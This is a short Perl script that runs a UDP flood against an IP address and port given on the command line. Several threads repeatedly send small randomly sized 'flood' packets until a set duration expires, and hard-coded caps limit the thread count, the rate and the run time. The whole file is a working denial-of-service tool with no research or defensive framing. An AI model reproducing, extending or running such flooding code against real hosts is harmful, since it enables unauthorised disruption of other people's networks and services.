use 5.010;
use Socket;
use threads;

my $thread_count = 5;
my $max_packet_size = 10;

my ($rpc, $threads, $ip, $port,$time) = @ARGV;

$ip = inet_aton($ip) or die("Invalid IP");
my $end = time() + ($time ? $time : 100);


if($port >= 65535 or $time > 200 or $rpc > 10 or $threads > 5){
    die("Invalid parameters")
}

socket(flood, PF_INET, SOCK_DGRAM, 17);

sub generate_packet{
    my $max_size = $_[0];
    return int(rand($max_size)); 
}
sub send_packet{
    $current_rpc = $_[0];
    $ip = $_[1];
    $port = $_[2];
    my $packet = generate_packet($max_packet_size);

    eval{   
        send(flood, pack("a$packet","flood"), 0, pack_sockaddr_in($port,$ip));
    };
    if($@)
    {
        sleep .05; 
    };
};

sub call{
    $current_thread = $_[0];
    threads->create(sub{
        print("Started thread $current_thread");        
        for(;time() <= $end;){
            for(my $rpc_db = 0; $rpc_db < $rpc; $rpc_db++){
                send_packet($rpc_db, $ip, $port);
            }
        }
    });
}
for(my $i = 0; $i < $threads; $i++){
    call($i);
}
$_->join() for threads->list();